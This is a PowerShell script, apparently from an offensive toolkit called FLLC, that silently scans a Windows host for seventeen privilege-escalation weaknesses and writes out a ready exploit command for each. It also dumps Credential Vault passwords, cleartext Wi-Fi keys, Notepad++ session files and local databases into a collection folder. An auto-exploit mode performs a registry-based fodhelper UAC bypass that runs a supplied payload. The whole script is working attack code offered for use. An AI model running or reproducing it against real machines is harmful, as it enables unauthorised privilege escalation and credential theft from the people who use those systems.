<# 
============================================================================
  FLLC — Windows Privilege Escalation Scanner + Auto-Exploiter
  ──────────────────────────────────────────────────────────────────
  
  Scans for 15+ privilege escalation vectors on Windows 10/11.
  Auto-exploits what it finds.  Fully silent — no GUI, no prompts.
  
  Vectors Checked:
    1.  AlwaysInstallElevated (MSI installer escalation)
    2.  Unquoted service paths (service hijacking)
    3.  Weak service permissions (service binary replacement)
    4.  Modifiable service binaries (direct replacement)
    5.  DLL search order hijacking (PATH-writable dirs)
    6.  Scheduled task manipulation (writable task actions)
    7.  Autorun registry keys (writable autorun binaries)
    8.  UAC bypass via fodhelper.exe
    9.  UAC bypass via eventvwr.exe
    10. UAC bypass via computerdefaults.exe
    11. UAC bypass via sdclt.exe (Win10 backupcompatibility)
    12. Token impersonation (SeImpersonate / SeAssignPrimary)
    13. Stored credentials (cmdkey / vault enumeration)
    14. WSL/Linux subsystem escalation
    15. Unpatched kernel CVEs (local kernel exploits)
    16. Notepad++ plugin DLL hijacking
    17. Notepad++ config file injection
  
  AUTHORIZED PENETRATION TESTING USE ONLY.
  FLLC — FLLC
============================================================================
#>

param(
    [string]$OutputDir = "$PSScriptRoot\..\collected\privesc",
    [string]$PayloadCmd = "",
    [switch]$ExploitMode = $false,
    [switch]$Silent = $true
)

$ErrorActionPreference = "SilentlyContinue"

# ══════════════════════════════════════════════════════════════════════════
#  INIT
# ══════════════════════════════════════════════════════════════════════════

if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$logFile   = Join-Path $OutputDir "privesc_scan_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
$jsonFile  = Join-Path $OutputDir "privesc_results.json"
$findings  = @()

function Log($msg) {
    $ts = Get-Date -Format "HH:mm:ss"
    $line = "[$ts] $msg"
    Add-Content -Path $logFile -Value $line -Encoding UTF8
    if (-not $Silent) { Write-Host $line }
}

function AddFinding($category, $severity, $detail, $exploit) {
    $script:findings += @{
        category = $category
        severity = $severity
        detail   = $detail
        exploit  = $exploit
        time     = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        hostname = $env:COMPUTERNAME
        user     = $env:USERNAME
    }
    Log "[VULN][$severity] $category: $detail"
}

Log "═══ FLLC PrivEsc Scanner Started ═══"
Log "Host: $env:COMPUTERNAME | User: $env:USERNAME | Domain: $env:USERDOMAIN"
Log "OS: $((Get-CimInstance Win32_OperatingSystem).Caption) $((Get-CimInstance Win32_OperatingSystem).Version)"
Log "Arch: $env:PROCESSOR_ARCHITECTURE | Admin: $([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# ══════════════════════════════════════════════════════════════════════════
#  1. AlwaysInstallElevated
# ══════════════════════════════════════════════════════════════════════════

Log "[1/17] Checking AlwaysInstallElevated..."
$hklm = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated 2>$null
$hkcu = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated 2>$null

if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
    AddFinding "AlwaysInstallElevated" "CRITICAL" "Both HKLM and HKCU AlwaysInstallElevated are set to 1. Any user can install MSI as SYSTEM." "msiexec /quiet /qn /i malicious.msi"
}

# ══════════════════════════════════════════════════════════════════════════
#  2. Unquoted Service Paths
# ══════════════════════════════════════════════════════════════════════════

Log "[2/17] Checking unquoted service paths..."
$services = Get-CimInstance Win32_Service | Where-Object {
    $_.PathName -and
    $_.PathName -notlike '"*' -and
    $_.PathName -notlike 'C:\Windows\*' -and
    $_.PathName -match '\s'
}

foreach ($svc in $services) {
    $path = $svc.PathName
    # Find the exploitable drop point
    $parts = $path -split '\\'
    $buildPath = ""
    foreach ($part in $parts) {
        if ($part -match '\s' -and $part -notmatch '\.exe') {
            $target = $buildPath + ($part -split '\s')[0] + ".exe"
            AddFinding "UnquotedServicePath" "HIGH" "Service '$($svc.Name)' has unquoted path: $path  |  Drop point: $target" "copy payload.exe `"$target`" && net stop $($svc.Name) && net start $($svc.Name)"
            break
        }
        $buildPath += "$part\"
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  3. Weak Service Permissions (service reconfiguration)
# ══════════════════════════════════════════════════════════════════════════

Log "[3/17] Checking weak service permissions..."
$allSvcs = Get-CimInstance Win32_Service
foreach ($svc in $allSvcs) {
    try {
        $sd = sc.exe sdshow $svc.Name 2>$null
        if ($sd -match "A;;RPWPCR;;;WD" -or $sd -match "A;;CCLCSWRPWPDTLOCRRC;;;WD") {
            AddFinding "WeakServicePerms" "HIGH" "Service '$($svc.Name)' grants excessive permissions to Everyone (WD)." "sc config $($svc.Name) binpath= `"cmd /c payload.exe`""
        }
        if ($sd -match "A;;RPWPCR;;;BU" -or $sd -match "A;;CCLCSWRPWPDTLOCRRC;;;BU") {
            AddFinding "WeakServicePerms" "HIGH" "Service '$($svc.Name)' grants excessive permissions to Built-in Users (BU)." "sc config $($svc.Name) binpath= `"cmd /c payload.exe`""
        }
    } catch {}
}

# ══════════════════════════════════════════════════════════════════════════
#  4. Modifiable Service Binaries
# ══════════════════════════════════════════════════════════════════════════

Log "[4/17] Checking modifiable service binaries..."
foreach ($svc in $allSvcs) {
    $binPath = $svc.PathName -replace '"','' -replace '\s+/.*','' -replace '\s+-.*',''
    if ($binPath -and (Test-Path $binPath)) {
        try {
            $acl = Get-Acl $binPath
            foreach ($ace in $acl.Access) {
                if ($ace.IdentityReference -match "(Everyone|BUILTIN\\Users|Authenticated Users)" -and
                    $ace.FileSystemRights -match "(Write|Modify|FullControl)") {
                    AddFinding "ModifiableServiceBin" "CRITICAL" "Service '$($svc.Name)' binary is writable by $($ace.IdentityReference): $binPath" "copy payload.exe `"$binPath`" && sc stop $($svc.Name) && sc start $($svc.Name)"
                }
            }
        } catch {}
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  5. DLL Search Order Hijacking (writable PATH dirs)
# ══════════════════════════════════════════════════════════════════════════

Log "[5/17] Checking DLL search order hijacking..."
$pathDirs = $env:PATH -split ';'
foreach ($dir in $pathDirs) {
    if ($dir -and (Test-Path $dir) -and $dir -notlike "C:\Windows\*") {
        try {
            $acl = Get-Acl $dir
            foreach ($ace in $acl.Access) {
                if ($ace.IdentityReference -match "(Everyone|BUILTIN\\Users|Authenticated Users)" -and
                    $ace.FileSystemRights -match "(Write|Modify|FullControl)") {
                    AddFinding "DLLHijack" "HIGH" "PATH directory writable by $($ace.IdentityReference): $dir" "copy malicious.dll `"$dir\target.dll`""
                }
            }
        } catch {}
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  6. Scheduled Task Manipulation
# ══════════════════════════════════════════════════════════════════════════

Log "[6/17] Checking scheduled tasks..."
try {
    $tasks = Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' }
    foreach ($task in $tasks) {
        foreach ($action in $task.Actions) {
            if ($action.Execute -and (Test-Path $action.Execute)) {
                try {
                    $acl = Get-Acl $action.Execute
                    foreach ($ace in $acl.Access) {
                        if ($ace.IdentityReference -match "(Everyone|BUILTIN\\Users|Authenticated Users)" -and
                            $ace.FileSystemRights -match "(Write|Modify|FullControl)") {
                            $runAs = $task.Principal.UserId
                            if ($runAs -match "(SYSTEM|Administrator)") {
                                AddFinding "ScheduledTaskHijack" "CRITICAL" "Task '$($task.TaskName)' runs as $runAs with writable binary: $($action.Execute)" "copy payload.exe `"$($action.Execute)`""
                            }
                        }
                    }
                } catch {}
            }
        }
    }
} catch {}

# ══════════════════════════════════════════════════════════════════════════
#  7. Autorun Registry (writable binaries in Run keys)
# ══════════════════════════════════════════════════════════════════════════

Log "[7/17] Checking autorun registry keys..."
$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
)

foreach ($key in $runKeys) {
    if (Test-Path $key) {
        $props = Get-ItemProperty $key
        foreach ($name in ($props.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' })) {
            $val = $name.Value
            $exePath = $val -replace '"','' -replace '\s+/.*','' -replace '\s+-.*',''
            if ($exePath -and (Test-Path $exePath)) {
                try {
                    $acl = Get-Acl $exePath
                    foreach ($ace in $acl.Access) {
                        if ($ace.IdentityReference -match "(Everyone|BUILTIN\\Users)" -and
                            $ace.FileSystemRights -match "(Write|Modify|FullControl)") {
                            AddFinding "AutorunHijack" "HIGH" "Autorun '$($name.Name)' at $key points to writable binary: $exePath" "copy payload.exe `"$exePath`""
                        }
                    }
                } catch {}
            }
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  8-11. UAC Bypass Methods
# ══════════════════════════════════════════════════════════════════════════

Log "[8/17] Checking UAC bypass vectors..."

# Current UAC level
$uacLevel = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin 2>$null
$uacVal = $uacLevel.ConsentPromptBehaviorAdmin
Log "  UAC ConsentPromptBehaviorAdmin = $uacVal (0=Never, 5=Default)"

if ($uacVal -le 3) {
    AddFinding "UACDisabled" "CRITICAL" "UAC is set to a low level ($uacVal). UAC bypasses are trivial." "Any auto-elevate binary works without prompt"
}

# fodhelper bypass (Windows 10+)
$fodHelper = "C:\Windows\System32\fodhelper.exe"
if (Test-Path $fodHelper) {
    AddFinding "UACBypass_FodHelper" "HIGH" "fodhelper.exe present — UAC bypass available via HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" "reg add HKCU\Software\Classes\ms-settings\shell\open\command /d cmd.exe /f && reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && fodhelper.exe"
}

# eventvwr bypass
$eventVwr = "C:\Windows\System32\eventvwr.exe"
if (Test-Path $eventVwr) {
    AddFinding "UACBypass_EventVwr" "HIGH" "eventvwr.exe present — UAC bypass via HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" "reg add HKCU\Software\Classes\mscfile\shell\open\command /d cmd.exe /f && eventvwr.exe"
}

# computerdefaults bypass
$compDef = "C:\Windows\System32\computerdefaults.exe"
if (Test-Path $compDef) {
    AddFinding "UACBypass_ComputerDefaults" "HIGH" "computerdefaults.exe present — UAC bypass via ms-settings" "reg add HKCU\Software\Classes\ms-settings\shell\open\command /d cmd.exe /f && computerdefaults.exe"
}

# sdclt bypass (Windows 10 backup)
$sdclt = "C:\Windows\System32\sdclt.exe"
if (Test-Path $sdclt) {
    AddFinding "UACBypass_Sdclt" "HIGH" "sdclt.exe present — UAC bypass via App Paths" "reg add `"HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`" /d cmd.exe /f && sdclt.exe /kickoffelev"
}

# ══════════════════════════════════════════════════════════════════════════
#  12. Token Impersonation Privileges
# ══════════════════════════════════════════════════════════════════════════

Log "[12/17] Checking token privileges..."
$privs = whoami /priv 2>$null
if ($privs) {
    $dangerousPrivs = @(
        "SeImpersonatePrivilege",
        "SeAssignPrimaryTokenPrivilege",
        "SeTcbPrivilege",
        "SeBackupPrivilege",
        "SeRestorePrivilege",
        "SeCreateTokenPrivilege",
        "SeLoadDriverPrivilege",
        "SeTakeOwnershipPrivilege",
        "SeDebugPrivilege"
    )
    foreach ($p in $dangerousPrivs) {
        if ($privs -match $p) {
            $status = if ($privs -match "$p\s+Enabled") { "ENABLED" } else { "Disabled (but held)" }
            AddFinding "TokenPrivilege" "CRITICAL" "$p is $status for current user" "Use PrintSpoofer/GodPotato/JuicyPotato to escalate via $p"
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  13. Stored Credentials
# ══════════════════════════════════════════════════════════════════════════

Log "[13/17] Checking stored credentials..."

# cmdkey stored creds
$cmdkey = cmdkey /list 2>$null
if ($cmdkey -match "Target:") {
    $targets = ($cmdkey | Select-String "Target:").Count
    AddFinding "StoredCreds" "HIGH" "$targets stored credential entries found via cmdkey /list" "cmdkey /list && runas /savecred /user:DOMAIN\user cmd.exe"
    Add-Content -Path (Join-Path $OutputDir "stored_creds.txt") -Value $cmdkey -Encoding UTF8
}

# Credential Manager vault
try {
    $vault = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]::new()
    $allCreds = $vault.RetrieveAll()
    if ($allCreds.Count -gt 0) {
        AddFinding "CredVault" "HIGH" "$($allCreds.Count) credentials in Windows Credential Vault" "Enumerate with PasswordVault API"
        foreach ($c in $allCreds) {
            try { $c.RetrievePassword() } catch {}
            Add-Content -Path (Join-Path $OutputDir "vault_creds.txt") -Value "Resource: $($c.Resource) | User: $($c.UserName) | Pass: $($c.Password)" -Encoding UTF8
        }
    }
} catch {}

# Wi-Fi passwords (bonus)
$wifiProfiles = netsh wlan show profiles 2>$null
if ($wifiProfiles) {
    $profiles = ($wifiProfiles | Select-String "All User Profile\s+:\s+(.+)").Matches | ForEach-Object { $_.Groups[1].Value.Trim() }
    foreach ($p in $profiles) {
        $detail = netsh wlan show profile name="$p" key=clear 2>$null
        $key = ($detail | Select-String "Key Content\s+:\s+(.+)").Matches | ForEach-Object { $_.Groups[1].Value.Trim() }
        if ($key) {
            Add-Content -Path (Join-Path $OutputDir "wifi_passwords.txt") -Value "$p : $key" -Encoding UTF8
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  14. WSL Escalation
# ══════════════════════════════════════════════════════════════════════════

Log "[14/17] Checking WSL..."
$wslExe = "C:\Windows\System32\wsl.exe"
if (Test-Path $wslExe) {
    $distros = wsl --list 2>$null
    if ($distros) {
        AddFinding "WSLPresent" "MEDIUM" "Windows Subsystem for Linux is installed. Root shell available via: wsl -u root" "wsl -u root -e bash -c 'whoami && cat /etc/shadow'"
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  15. Kernel Version / Missing Patches
# ══════════════════════════════════════════════════════════════════════════

Log "[15/17] Checking patch level..."
$os = Get-CimInstance Win32_OperatingSystem
$build = [int]$os.BuildNumber
$hotfixes = Get-HotFix | Sort-Object InstalledOn -Descending
$lastPatch = if ($hotfixes) { $hotfixes[0].InstalledOn } else { "UNKNOWN" }

Log "  Build: $build | Last patch: $lastPatch"

# Known vulnerable builds (non-exhaustive check)
$vulnBuilds = @{
    17134 = "CVE-2021-1732 (Win32k EoP)"
    17763 = "CVE-2021-36934 (HiveNightmare/SAM access)"
    18362 = "CVE-2020-0796 (SMBGhost)"
    18363 = "CVE-2020-0796 (SMBGhost)"
    19041 = "CVE-2021-36934 (HiveNightmare)"
    19042 = "CVE-2021-36934 (HiveNightmare)"
    19043 = "CVE-2021-34527 (PrintNightmare)"
    19044 = "CVE-2022-21882 (Win32k EoP)"
    19045 = "Multiple EoP CVEs if unpatched"
    22000 = "CVE-2022-21882 (Win32k EoP) if unpatched"
    22621 = "Check CVE-2023-36874 (WER EoP)"
    22631 = "Check CVE-2024-30088 (Kernel EoP)"
}

if ($vulnBuilds.ContainsKey($build)) {
    AddFinding "KernelVuln" "HIGH" "Build $build may be vulnerable to $($vulnBuilds[$build])" "Check specific CVE exploit availability"
}

# SAM/SYSTEM file readable? (HiveNightmare / SeriousSAM)
$samPaths = @(
    "C:\Windows\System32\config\SAM",
    "C:\Windows\System32\config\SYSTEM",
    "C:\Windows\System32\config\SECURITY"
)
foreach ($sp in $samPaths) {
    $shadowCopy = Get-CimInstance Win32_ShadowCopy 2>$null | Select-Object -First 1
    if ($shadowCopy) {
        AddFinding "HiveNightmare" "CRITICAL" "Volume shadow copies exist — SAM/SYSTEM hives may be extractable without admin" "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM ."
    }
}

# PrintNightmare check
$printSpooler = Get-Service Spooler -ErrorAction SilentlyContinue
if ($printSpooler -and $printSpooler.Status -eq 'Running') {
    $pnReg = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name NoWarningNoElevationOnInstall 2>$null
    if ($pnReg.NoWarningNoElevationOnInstall -eq 1) {
        AddFinding "PrintNightmare" "CRITICAL" "Print Spooler running + Point-and-Print NoWarning enabled — PrintNightmare exploitable" "Use CVE-2021-34527 exploit to add admin user"
    } else {
        AddFinding "PrintSpoolerRunning" "MEDIUM" "Print Spooler service is running (potential PrintNightmare target if unpatched)" "Check patch level for CVE-2021-34527"
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  16. Notepad++ Plugin DLL Hijacking
# ══════════════════════════════════════════════════════════════════════════

Log "[16/17] Checking Notepad++ vulnerabilities..."

$nppPaths = @(
    "${env:ProgramFiles}\Notepad++",
    "${env:ProgramFiles(x86)}\Notepad++",
    "$env:LOCALAPPDATA\Notepad++",
    "$env:APPDATA\Notepad++"
)

$nppInstall = $null
foreach ($np in $nppPaths) {
    if (Test-Path "$np\notepad++.exe") { $nppInstall = $np; break }
}

if ($nppInstall) {
    Log "  Notepad++ found: $nppInstall"
    
    # Get version
    $nppVer = (Get-Item "$nppInstall\notepad++.exe").VersionInfo.FileVersion
    Log "  Version: $nppVer"
    
    # Check plugin directory permissions
    $pluginDir = "$nppInstall\plugins"
    if (Test-Path $pluginDir) {
        try {
            $acl = Get-Acl $pluginDir
            foreach ($ace in $acl.Access) {
                if ($ace.IdentityReference -match "(Everyone|BUILTIN\\Users|Authenticated Users)" -and
                    $ace.FileSystemRights -match "(Write|Modify|FullControl)") {
                    AddFinding "NPP_PluginDirWritable" "CRITICAL" "Notepad++ plugins directory writable by $($ace.IdentityReference): $pluginDir — DLL hijacking possible" "copy malicious.dll `"$pluginDir\mimeTools\mimeTools.dll`""
                }
            }
        } catch {}
    }
    
    # Check if updater directory is writable (GUP.exe DLL hijack)
    $updaterDir = "$nppInstall\updater"
    if (Test-Path $updaterDir) {
        try {
            $acl = Get-Acl $updaterDir
            foreach ($ace in $acl.Access) {
                if ($ace.IdentityReference -match "(Everyone|BUILTIN\\Users)" -and
                    $ace.FileSystemRights -match "(Write|Modify|FullControl)") {
                    AddFinding "NPP_UpdaterHijack" "CRITICAL" "Notepad++ updater directory writable: $updaterDir — GUP.exe DLL sideloading possible" "copy malicious_libcurl.dll `"$updaterDir\libcurl.dll`""
                }
            }
        } catch {}
    }
    
    # Check for vulnerable plugins loading from %APPDATA%
    $appDataPlugins = "$env:APPDATA\Notepad++\plugins"
    if (Test-Path $appDataPlugins) {
        AddFinding "NPP_AppDataPlugins" "HIGH" "Notepad++ loads plugins from user-writable APPDATA: $appDataPlugins" "Place DLL in $appDataPlugins\pluginName\pluginName.dll"
    }
    
    # Check config.xml for interesting data
    $configXml = "$env:APPDATA\Notepad++\config.xml"
    if (Test-Path $configXml) {
        $config = Get-Content $configXml -Raw
        # Recent files may contain sensitive paths
        Add-Content -Path (Join-Path $OutputDir "npp_config.txt") -Value $config -Encoding UTF8
    }
    
    # Session file (contains all open file paths)
    $sessionFile = "$env:APPDATA\Notepad++\session.xml"
    if (Test-Path $sessionFile) {
        $session = Get-Content $sessionFile -Raw
        Add-Content -Path (Join-Path $OutputDir "npp_session.txt") -Value $session -Encoding UTF8
        
        # Extract file paths from session
        $openFiles = ([xml]$session).NotepadPlus.Session.mainView.File | ForEach-Object { $_.filename }
        if ($openFiles) {
            AddFinding "NPP_SessionFiles" "MEDIUM" "$($openFiles.Count) files in Notepad++ session — may contain credentials/configs" "Review: $(Join-Path $OutputDir 'npp_session.txt')"
        }
    }
    
    # Notepad++ known CVEs by version
    $majorMinor = $nppVer -replace '(\d+\.\d+).*', '$1'
    $versionNum = [double]$majorMinor
    
    if ($versionNum -lt 8.5) {
        AddFinding "NPP_CVE_Overflow" "HIGH" "Notepad++ $nppVer < 8.5 vulnerable to CVE-2023-40031 (heap buffer overflow via crafted file) + CVE-2023-40036 (global buffer read overflow)" "Craft malicious .txt/.xml file triggering buffer overflow on open"
    }
    if ($versionNum -lt 8.6) {
        AddFinding "NPP_CVE_Trust" "HIGH" "Notepad++ $nppVer < 8.6 — plugin loading lacks certificate validation, allowing unsigned DLL injection" "Replace any plugin DLL with payload DLL"
    }
    
} else {
    Log "  Notepad++ not found"
}

# ══════════════════════════════════════════════════════════════════════════
#  17. SQL Injection Surface (local web servers)
# ══════════════════════════════════════════════════════════════════════════

Log "[17/17] Checking for local SQL injection surfaces..."

# Find running web servers
$webProcesses = Get-Process -Name "httpd","apache","nginx","node","tomcat*","w3wp","php-cgi","python","ruby" -ErrorAction SilentlyContinue
if ($webProcesses) {
    $procList = ($webProcesses | Select-Object -Unique Name | ForEach-Object { $_.Name }) -join ", "
    AddFinding "LocalWebServer" "MEDIUM" "Local web server processes running: $procList — potential SQL injection targets on localhost" "Run sqlmap against http://localhost with discovered endpoints"
}

# Check for common database files
$dbSearchPaths = @("$env:USERPROFILE", "C:\inetpub", "C:\xampp", "C:\wamp", "C:\laragon")
foreach ($sp in $dbSearchPaths) {
    if (Test-Path $sp) {
        $dbs = Get-ChildItem -Path $sp -Recurse -Include "*.sqlite","*.sqlite3","*.db","*.mdb","*.accdb","*.sql" -ErrorAction SilentlyContinue | Select-Object -First 20
        foreach ($db in $dbs) {
            AddFinding "LocalDatabase" "MEDIUM" "Database file found: $($db.FullName) ($($db.Length / 1KB) KB)" "Copy and examine: copy `"$($db.FullName)`" ."
            # Copy small DB files to output
            if ($db.Length -lt 10MB) {
                $destDb = Join-Path $OutputDir $db.Name
                Copy-Item $db.FullName $destDb -Force 2>$null
            }
        }
    }
}

# Check for SQL Server instances
$sqlInstances = Get-CimInstance -ClassName Win32_Service | Where-Object { $_.Name -match "MSSQL|MySQL|Postgres|MariaDB" -and $_.State -eq "Running" }
foreach ($si in $sqlInstances) {
    AddFinding "SQLServerRunning" "HIGH" "SQL server running: $($si.Name) ($($si.DisplayName)) as $($si.StartName)" "Attempt default creds or local auth escalation"
}

# ══════════════════════════════════════════════════════════════════════════
#  AUTO-EXPLOIT (if enabled)
# ══════════════════════════════════════════════════════════════════════════

if ($ExploitMode -and $PayloadCmd) {
    Log "═══ AUTO-EXPLOIT MODE ═══"
    
    # Try UAC bypass via fodhelper first (most reliable)
    $criticals = $findings | Where-Object { $_.severity -eq "CRITICAL" -and $_.category -match "UACBypass" }
    
    if ($criticals) {
        Log "[EXPLOIT] Attempting fodhelper UAC bypass..."
        
        # Clean up any existing keys
        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force 2>$null
        
        # Set payload
        New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
        Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value $PayloadCmd -Force
        New-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
        
        # Trigger
        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
        Start-Sleep -Seconds 3
        
        # Cleanup
        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force 2>$null
        
        Log "[EXPLOIT] fodhelper bypass triggered"
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  SAVE RESULTS
# ══════════════════════════════════════════════════════════════════════════

$summary = @{
    scan_time     = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    hostname      = $env:COMPUTERNAME
    username      = $env:USERNAME
    domain        = $env:USERDOMAIN
    os_version    = $os.Caption
    os_build      = $build
    is_admin      = $isAdmin
    total_findings= $findings.Count
    critical      = ($findings | Where-Object { $_.severity -eq "CRITICAL" }).Count
    high          = ($findings | Where-Object { $_.severity -eq "HIGH" }).Count
    medium        = ($findings | Where-Object { $_.severity -eq "MEDIUM" }).Count
    findings      = $findings
}

$summary | ConvertTo-Json -Depth 5 | Out-File -FilePath $jsonFile -Encoding UTF8

# Text summary
$txtFile = Join-Path $OutputDir "privesc_summary.txt"
$txt = @"
════════════════════════════════════════════════════════════
  FLLC PRIVESC SCAN — $env:COMPUTERNAME
════════════════════════════════════════════════════════════
  Time:     $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
  User:     $env:USERDOMAIN\$env:USERNAME
  Admin:    $isAdmin
  OS:       $($os.Caption) Build $build
  Findings: $($findings.Count) total
    CRITICAL: $(($findings | Where-Object { $_.severity -eq "CRITICAL" }).Count)
    HIGH:     $(($findings | Where-Object { $_.severity -eq "HIGH" }).Count)
    MEDIUM:   $(($findings | Where-Object { $_.severity -eq "MEDIUM" }).Count)
════════════════════════════════════════════════════════════

"@

foreach ($f in ($findings | Sort-Object { switch ($_.severity) { "CRITICAL" {0} "HIGH" {1} "MEDIUM" {2} default {3} } })) {
    $txt += "[$($f.severity)] $($f.category)`n"
    $txt += "  $($f.detail)`n"
    $txt += "  Exploit: $($f.exploit)`n`n"
}

$txt | Out-File -FilePath $txtFile -Encoding UTF8

Log "═══ Scan Complete: $($findings.Count) findings ($($summary.critical) critical, $($summary.high) high) ═══"
Log "Results: $jsonFile"
